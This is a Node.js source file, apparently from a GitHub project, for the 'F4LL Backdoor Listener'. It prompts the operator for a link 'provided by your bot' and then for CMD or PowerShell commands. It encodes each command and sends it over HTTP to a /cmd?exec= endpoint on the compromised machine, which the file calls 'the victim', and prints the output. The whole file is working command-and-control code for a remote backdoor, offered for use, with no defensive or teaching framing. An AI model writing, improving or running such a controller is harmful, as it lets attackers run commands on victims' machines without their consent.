const http = require('http')
const readline = require('readline-sync')
process.title = "[!] - F4LL Backdoor Listener | github.com/F4LLUHQ - [!]" // title
let red = "\x1b[31m"
let green = "\x1b[32m"
let magenta = "\x1b[35m"
let reset = "\x1b[0m" 
console.clear()
var consolee = `
${red}
███████╗██╗  ██╗██╗     ██╗         ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██╔════╝██║  ██║██║     ██║         ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
█████╗  ███████║██║     ██║         ██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██╔══╝  ╚════██║██║     ██║         ██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
██║          ██║███████╗███████╗    ██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═╝          ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                                                      
${reset}By ${green}@f4ll_1337${reset} CMD/Powershell command ${green}avaible${reset}
`

console.log(consolee)
console.log(`[${red}!${reset}] - Vhen you close the listener the connection with the victim is terminated.`)
let linkk = readline.question(`[${magenta}$${reset}] - Link provided by your bot : `)
let link = linkk.replace('https', "http")
function command() {
    let com = readline.question(`\n[${magenta}+${reset}] - Command : `)
    let comm = com.replace(' ', '%20')
    let commm = comm.replace(':', '%3A')
    let commmm = commm.replace('/', '%2F')
    let commmmm = commmm.replace('&', "%26")
      http.get(`${link}/cmd?exec=${commmmm}`, function(res) {     
        res.on("data", function(chunk) {
          console.log("Reponse : " + chunk);
          command()
        });
      }).on('error', function(e) {
        console.log("Got error: " + e.message);
        command()
      });
}
command()